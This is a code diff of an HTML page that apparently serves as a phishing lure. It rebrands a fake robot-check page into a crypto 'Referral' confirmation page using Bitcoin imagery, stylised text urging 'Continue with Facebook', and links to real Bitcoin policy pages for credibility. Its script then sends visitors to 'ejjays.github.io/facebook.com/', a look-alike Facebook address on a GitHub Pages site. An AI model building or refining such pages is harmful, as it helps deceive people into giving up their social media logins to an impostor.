@@ -3,28 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirm you're not a Robot</title>
+    <title>Referral | Crypto</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-image: url('https://images.hdqwalls.com/wallpapers/bitcoin-4k-q7.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .referral-page {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .img.img._2sxw {
+            width: 55px;
+            height: 55px;
+            background-image: url('https://bitcoin.org/img/icons/opengraph.png?1644775662');
+            background-size: cover;
+            background-position: center;
+            border-radius: 10px;
+            transform: scale(1.2);
+            margin-bottom: 0.1px; /* Increase the spacing between the image and the "Confirmation" text */
+        }
+
+        .centered-text {
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 8px; /* Increase the spacing between form elements */
+        }
+
+        .privacy-policy,
+        .user-agreement {
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .italic-text {
+            font-style: italic;
+        }
+
+        .checkbox-error {
+            color: red;
+            text-align: center;
+            font-style: italic;
+        }
+    </style>
 </head>
 <body>
-    <!-- I'm not a Robot confirmation Page -->
+    <!-- Referral Page -->
     <div id="referralPage" class="container flex">
         <div class="referral-page flex">
-            <h1 style="text-align: center;">I'm not a Robot</h1>
-            <form id="referralForm" action="#">
+            <div class="img img _2sxw"></div>
+            <h1 style="margin-top: 20px;">Confirmation</h1>
+            <form id="referralForm">
                 <div class="form-group">
-                    <label for="referral_code" class="confirm-text">*Confirm you're not a robot...</label>
+                    <label for="referral_code">𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐰𝐢𝐭𝐡 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐭𝐨 𝐜𝐨𝐧𝐟𝐢𝐫𝐦 𝐲𝐨𝐮 𝐚𝐫𝐞 𝐚 𝐧𝐞𝐰 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥 𝐛𝐲 𝙀𝙟𝙟𝙖𝙮𝙨.</label>
                 </div>
                 <div class="form-group">
-                    <button type="button" onclick="redirectToFacebook()">Login to Facebook</button>
+                    <button type="submit" id="continueButton">Continue with Facebook</button>
+                </div>
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" name="remember" class="checkbox"><span class="italic-text">I agree to the terms and Policy</span>
+                    </label>
+                </div>
+                <div class="form-group">
+                    <div class="centered-text">
+                        <p>See our <span class="privacy-policy">𝗣𝗿𝗶𝘃𝗮𝗰𝘆 𝗣𝗼𝗹𝗶𝗰𝘆</span> and <span class="user-agreement">𝗨𝘀𝗲𝗿 𝗔𝗴𝗿𝗲𝗲𝗺𝗲𝗻𝘁</span></p>
+                   </div>
+                </div>
+                <div class="form-group">
+                    <div class="checkbox-error" id="loginMessage"></div>
                 </div>
             </form>
         </div>
     </div>
 
     <script>
+        // Add event listeners to the privacy policy and user agreement links
+        document.querySelector('.privacy-policy').addEventListener('click', () => {
+            window.location.href = 'https://bitcoin.org/en/privacy';
+        });
+
+        document.querySelector('.user-agreement').addEventListener('click', () => {
+            window.location.href = 'https://www.bitcoin.com/legal/user-agreement/#:~:text=BITCOIN.COM%20DISCLAIMS%20ANY%20AND,QUIET%20ENJOYMENT%2C%20AND%20ANY%20SERVICES';
+        });
+
+        document.getElementById('referralForm').addEventListener('submit', (event) => {
+            event.preventDefault(); // Prevent the default form submission
+            const checkbox = document.querySelector('.checkbox');
+            const loginMessage = document.getElementById('loginMessage');
+
+            if (!checkbox.checked) {
+                loginMessage.textContent = '*Please agree to the terms and policy to continue.';
+                loginMessage.style.color = 'red';
+                loginMessage.style.fontStyle = 'italic';
+            } else {
+                redirectToFacebook();
+            }
+        });
+
         function redirectToFacebook() {
-            window.location.href = "https://ejjays.github.io/facebook.com/";
+            window.location.href = 'https://ejjays.github.io/facebook.com/';
         }
     </script>
 </body>
